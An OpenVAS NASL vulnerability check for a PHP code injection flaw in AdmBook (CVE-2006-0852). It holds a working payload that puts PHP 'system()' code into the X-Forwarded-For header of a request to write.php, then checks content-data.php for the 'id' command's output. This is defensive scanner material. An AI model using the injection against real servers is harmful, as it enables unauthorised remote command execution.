###############################################################################
# OpenVAS Vulnerability Test
# $Id: admbook_cmd_exec.nasl 12150 2018-10-29 11:46:42Z cfischer $
#
# Admbook PHP Code Injection Flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2008 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Ref: rgod
# Special thanks to George

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80048");
  script_version("$Revision: 12150 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-29 12:46:42 +0100 (Mon, 29 Oct 2018) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_cve_id("CVE-2006-0852");
  script_bugtraq_id(16753);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Admbook PHP Code Injection Flaw");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2008 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/admbook_122_xpl.pl");

  script_tag(name:"summary", value:"The remote version of AdmBook is prone to remote PHP code
  injection due to a lack of sanitization of the HTTP header 'X-Forwarded-For'.");

  script_tag(name:"impact", value:"Using a specially-crafted URL, a malicious user can execute
  arbitrary command on the remote server subject to the privileges of the web server user id.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");

vtstrings = get_vt_strings();

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/admbook", "/guestbook", "/gb", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  cmd = "id";
  magic = rand_str();

  req = http_get( item:string( dir, "/write.php?name=", vtstrings["lowercase"], "&email=", vtstrings["lowercase"], "@", this_host(), "&message=", urlencode(str:string(vtstrings["default"], " ran at ", unixtime())) ), port:port );
  req = str_replace( string:req, find:"User-Agent:", replace:string('X-FORWARDED-FOR: 127.0.0.1 ";system(', cmd, ');echo "', magic, '";echo"\r\n',"User-Agent:" ));
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  # nb: there won't necessarily be any output from the first request.

  req = http_get(item:string(dir, "/content-data.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) continue;

  if(magic >< res && output = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)) {
    report = "It was possible to execute the command '" + cmd + "' on the remote host, which produces the following output :" + '\n\n' + output;
    security_message(port:port, data:report);
    exit( 0 );
  }
}

exit( 0 );